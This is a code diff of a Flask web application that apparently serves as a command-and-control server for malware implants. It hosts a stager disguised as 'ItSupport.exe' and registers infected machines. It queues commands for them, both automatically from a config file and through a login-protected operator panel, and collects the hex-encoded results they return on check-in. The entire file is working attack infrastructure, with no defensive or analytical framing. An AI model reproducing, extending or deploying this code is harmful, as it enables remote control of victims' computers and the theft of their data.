@@ -1,29 +1,36 @@
-from flask import Flask, request, Response, jsonify, send_file, send_from_directory, safe_join, abort
+from flask import Flask, request, Response,send_from_directory, abort, render_template, redirect, Blueprint, flash
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 from dataclasses import dataclass
-import json
+from werkzeug.security import generate_password_hash, check_password_hash
+from flask_login import UserMixin, LoginManager, login_user, login_required, logout_user, current_user
 import os
-import pathlib
+import yaml
 
 app = Flask(__name__, static_url_path='')
+auth = Blueprint('auth', __name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
 db = SQLAlchemy(app)
-
+app.config['SECRET_KEY'] = 'hjshjhdjah kjshkjdhjs'
 app.config['EXECUTABLES'] = 'static/resources/exe/'
 
-@dataclass
-class Client(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    name = db.Column(db.String(80), unique=True, nullable=False)
-    date_created = db.Column(db.DateTime, default=datetime.utcnow)
+app.register_blueprint(auth, url_prefix='/')
+login_manager = LoginManager()
+login_manager.login_view = '/login'
+login_manager.init_app(app)
 
-    def __repr__(self):
-        return '<Task %r>' % self.id
+@login_manager.user_loader
+def load_user(id):
+    return User.query.get(int(id))
 
+with open("config.yaml", "r") as stream:
+    try:
+        appConfig = yaml.safe_load(stream)
+    except yaml.YAMLError as exc:
+        print(exc)
+        
 @dataclass
 class Implant(db.Model):
-    id: int
     guid: str
     computerName: str
     username: str
@@ -32,8 +39,7 @@ class Implant(db.Model):
     lastSeen: datetime
     dateCreated: datetime
 
-    id = db.Column(db.Integer, primary_key=True)
-    guid = db.Column(db.String(80), unique=True)
+    guid = db.Column(db.String(80), primary_key=True)
     computerName = db.Column(db.String(80))
     username = db.Column(db.String(80))
     ip = db.Column(db.String(80), unique=True)
@@ -41,33 +47,48 @@ class Implant(db.Model):
     lastSeen = db.Column(db.DateTime, default=datetime.utcnow)
     dateCreated = db.Column(db.DateTime, default=datetime.utcnow)
 
-    def __init__(self, guid, computerName, username, ip, mac):
+    def __init__(self, guid, computerName, username):
         self.guid = guid
         self.computerName = computerName
         self.username = username
-        self.ip = ip
-        self.mac = mac
 
     def __repr__(self):
-        return '<Implant %r>' % self.id
+        return '<Implant %r>' % self.guid
 
 @dataclass
 class Job(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    job = db.Column(db.String(80), nullable=False)
-    job_init_time = db.Column(db.DateTime, nullable=False)
-    job_status = db.Column(db.String(80), nullable=False)
-    job_response = db.Column(db.String(80), nullable=False)
+    implantId = db.Column(db.Integer)
+    command = db.Column(db.String(200))
+    status = db.Column(db.String(80), default="TBD")
+    response = db.Column(db.String(80))
+
+    def __init__(self, implantId, command):
+        self.implantId = implantId
+        self.command = command
+
+    def __repr__(self):
+        return '<Task %r>' % self.id
+
+class User(db.Model, UserMixin):
+    id = db.Column(db.Integer, primary_key=True)
+    email = db.Column(db.String(150), unique=True)
+    password = db.Column(db.String(150))
+    first_name = db.Column(db.String(150))
+
+    def __init__(self, email, password, first_name):
+        self.email = email
+        self.password = password
+        self.first_name = first_name
 
     def __repr__(self):
         return '<Task %r>' % self.id
 
 @app.route('/')
+@login_required
 def index():
-    if(request.headers.get('User-Agent') == 'ch0nky'):
-        return jsonify(Implant.query.all())
-    else:
-        return Response(status=404, mimetype='application/json')
+    implants = Implant.query.order_by(Implant.dateCreated).all()
+    return render_template('index.html', implants=implants)
 
 @app.route('/ItSupport.exe')
 def stager():
@@ -101,47 +122,128 @@ def implant():
 
 @app.route('/register', methods=['POST'])
 def register():
-    data = request.get_json(force=True)
-    new_instance = Implant(data['guid'], data['computerName'], data['username'], data['ip'], data['mac'])
-
+    data = request.form
+    implantId = bytes.fromhex(data['guid']).decode("ASCII")
+    new_instance = Implant(implantId, bytes.fromhex(data['username']).decode("ASCII"), bytes.fromhex(data['computerName']).decode("ASCII"))
     try:
+        for command in appConfig["commands"]:
+            job = Job(implantId,command)
+            db.session.add(job)
+        newjob = Job.query.filter_by(implantId=implantId).filter_by(status="TBD").first()
+        newjob.status = "STARTED"
+        newCommand = newjob.command
         db.session.add(new_instance)
         db.session.commit()
-        data = Implant.query.all()
-        for implant in data:
-            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
-        return Response(status=201, mimetype='application/json')
     except:
         return Response(status=500, mimetype='application/json')
+    return Response(newCommand, status=201, mimetype='text/html; charset=utf-8')
 
-@app.route('/checkin/<int:id>', methods=['POST'])
-def checkin(id):
-    implant_to_update = Implant.query.get_or_404(id)
-    data = request.get_json(force=True)
-    implant_to_update.computerName = data['computerName']
-    implant_to_update.lastSeen = datetime.utcnow
+@app.route('/checkin/<guid>', methods=['POST'])
+def checkin(guid):
+    data = request.form
+    print(data['hex'])
+    decoded = bytes.fromhex(data['hex']).decode("ASCII")
+    implant = Implant.query.get_or_404(guid)
+    implant.lastSeen = datetime.now()
+    currentJobExists = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").scalar() is not None
+    print(currentJobExists)
+    if currentJobExists:
+        job = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").first()
+        job.response = decoded
+        job.status = "DONE"
+    nextJobExists = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first() is not None
+    print(nextJobExists)
+    if nextJobExists:
+        nextJob = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first()
+        nextJob.status = "STARTED"
     try:
         db.session.commit()
-        implants = Implant.query.all()
-        for implant in implants:
-            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
-        return Response(status=200, mimetype='application/json')
+        jobs = Job.query.all()
+        for job in jobs:
+            print(job.id, job.implantId, job.command, job.status, job.response)
     except:
         return Response(status=500, mimetype='application/json')
-
-@app.route('/delete/<int:id>')
-def delete(id):
-    implant_to_delete = Implant.query.get_or_404(id)
-
     try:
-        db.session.delete(implant_to_delete)
-        db.session.commit()
-        implants = Implant.query.all()
-        for implant in implants:
-            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
-        return Response(status=200, mimetype='application/json')
+        nextJob
+        return Response(nextJob.command, status=201, mimetype='text/html; charset=utf-8')
     except:
-        return Response(status=500, mimetype='application/json')
+        return Response(status=201, mimetype='text/html; charset=utf-8')
+
+@app.route('/jobs/<guid>')
+@login_required
+def jobs(guid):
+    jobs = Job.query.filter_by(implantId=guid).all()
+    return render_template('details.html', jobs=jobs)
+
+@app.route('/job/add/<guid>', methods=['POST'])
+@login_required
+def addJobs(guid):
+    command = request.form['command']
+    job = Job(guid,command)
+    db.session.add(job)
+    db.session.commit()
+    jobs = Job.query.filter_by(implantId=guid).all()
+    return render_template('details.html', jobs=jobs)
+
+@app.route('/delete/<guid>')
+@login_required
+def delete(guid):
+    implant = Implant.query.get_or_404(guid)
+    jobs = Job.query.filter_by(implantId=guid).all()
+    try:
+        for job in jobs:
+            db.session.delete(job)
+        db.session.delete(implant)
+        db.session.commit()
+        return redirect('/')
+    except:
+        return Response("Error deleting implant", status=500, mimetype='application/json')
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        email = request.form.get('email')
+        password = request.form.get('password')
+
+        user = User.query.filter_by(email=email).first()
+        if user:
+            if check_password_hash(user.password, password):
+                flash('Logged in successfully!', category='success')
+                login_user(user, remember=True)
+                return redirect('/')
+            else:
+                flash('Incorrect password, try again.', category='error')
+        else:
+            flash('Email does not exist.', category='error')
+
+    return render_template("login.html", user=current_user)
+
+@app.route('/sign-up', methods=['GET', 'POST'])
+def sign_up():
+    if request.method == 'POST':
+        email = request.form.get('email')
+        first_name = request.form.get('firstName')
+        password1 = request.form.get('password1')
+
+        user = User.query.filter_by(email=email).first()
+        if user:
+            flash('Email already exists.', category='error')
+        else:
+            new_user = User(email=email, first_name=first_name, password=generate_password_hash(
+                password1, method='sha256'))
+            db.session.add(new_user)
+            db.session.commit()
+            login_user(new_user, remember=True)
+            flash('Account created!', category='success')
+            return redirect('/')
+
+    return render_template("sign-up.html", user=current_user)
+
+@app.route('/logout')
+@login_required
+def logout():
+    logout_user()
+    return redirect('/login')
 
 if __name__ == "__main__":
     app.run(host="localhost", port=8050, debug=True)
